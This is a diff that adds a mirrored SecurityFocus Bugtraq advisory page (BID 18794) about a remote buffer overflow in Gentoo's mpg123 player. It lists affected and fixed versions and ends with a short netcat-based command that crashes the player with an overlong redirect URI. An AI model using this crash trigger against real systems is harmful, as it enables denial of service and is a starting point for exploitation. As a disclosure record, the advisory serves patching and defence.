@@ -1,0 +1,100 @@
+#SpeeDr00t@Black Falcon<br>#bid18794<p><b><span style="font-size: 18pt;">Gentoo-Specific MPG123 Malicious URI Remote Buffer Overflow Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/18794/info">info</a><br><a href="http://www.securityfocus.com/bid/18794/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/18794/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/18794/solution">solution</a><br><a href="http://www.securityfocus.com/bid/18794/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				18794
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Apr 03 2006 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 05 2006 04:19PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery is credited to Horst Schirmeier &lt;gentoo@schirmeier.com&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Gentoo media-sound/mpg123  0<br/>
+					
+				
+					Gentoo Linux  <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Gentoo media-sound/mpg123  0.59s -r11<br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following commands are sufficient to demonstrate this issue by crashing affected applications:<br/><br/>( echo -ne "HTTP/1.1 302 Found\r\nLocation: "<br/>  echo -ne "http://fooooooooooooooooooooooooooooooooooooooooooooooooo/\r\n\r\n"<br/>)| nc -lp 8080 &amp;<br/><br/>mpg123 http://localhost:8080/<br/><br/>Currently we are not aware of any exploits for this issue.#no_exploit &lt;mailto:vuldb@#no_exploit&gt;.
+	
+		<ul>
+</ul>
+</div>
